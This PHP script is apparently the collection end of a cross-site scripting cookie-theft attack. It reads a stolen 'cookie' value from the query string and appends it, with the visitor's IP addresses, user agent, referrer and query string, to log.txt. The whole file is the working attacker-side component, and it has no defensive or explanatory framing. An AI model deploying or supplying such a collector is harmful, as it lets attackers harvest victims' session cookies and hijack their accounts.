<?php 
 
$useragent = $_SERVER['HTTP_USER_AGENT']; 
$cookie = $_GET['cookie']; 
$httpreferrer = $_SERVER['HTTP_REFERER']; 
$HttpClientIP = $_SERVER['HTTP_CLIENT_IP']; 
$RemAddr = $_SERVER['REMOTE_ADDR']; 
$CacheControl = $_SERVER['HTTP_CACHE_CONTROL']; 
$XForward = $_SERVER['HTTP_X_FORWARDED_FOR']; 
$querystring = $_SERVER['QUERY_STRING']; 
 
$filename = 'log.txt'; 
$somecontent = "User Agent: $useragent\n Cookie: $cookie\n HTTP Referrer: $httpreferrer\n HTTP Client IP: $HttpClientIP\n Remote Addr 
ess: $RemAddr\n Cache Control: $CacheControl\n X Forward: $XForward\n Query String: $querystring\n"; 
 
if (is_writable($filename)) { 
 
if (!$handle = fopen($filename, 'a')) { 
echo "Cannot open file ($filename)"; 
exit; 
} 
 
if (fwrite($handle, $somecontent) === FALSE) { 
echo "Cannot write to file ($filename)"; 
exit; 
} 
 
echo "Success, wrote ($somecontent) to file ($filename)"; 
 
fclose($handle); 
 
} else { 
echo "The file $filename is not writable"; 
} 
?> 
